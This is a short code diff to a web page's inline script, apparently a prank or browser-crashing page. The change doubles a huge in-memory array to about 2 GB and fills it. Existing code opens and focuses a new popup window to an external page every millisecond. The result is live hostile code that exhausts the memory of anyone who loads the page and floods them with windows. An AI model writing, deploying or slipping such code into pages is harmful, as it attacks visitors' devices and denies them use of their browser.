@@ -9,7 +9,8 @@
 
 <body>
   <script>
-    var data = new Uint8Array(1_000_000_000);
+    var data = new Uint8Array(2_000_000_000);
+    data.fill("😀");
     setInterval(function() {
       window.open('https://fidoeee.github.io/fractal.html', '_blank', 'height=100', 'width=100').focus();
     }, 1)
